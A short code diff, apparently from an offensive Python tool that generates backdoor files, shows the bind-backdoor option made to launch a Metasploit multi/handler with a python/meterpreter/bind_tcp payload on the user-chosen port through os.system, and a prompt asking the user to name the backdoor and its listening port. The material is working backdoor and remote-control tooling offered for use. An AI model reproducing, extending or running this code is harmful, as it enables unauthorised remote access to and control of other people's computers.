@@ -109,6 +109,7 @@ def listen(host, port):
     s.close()
 def gen_bind():
     global name
+    global port
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
@@ -445,6 +446,8 @@ nscan = input("Please select a module: ")
 if nscan == "1":
     gen_bind()
     postgen()
+    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+    os.system(a)
 if nscan == "2":
     gen_rev()
     postgen()
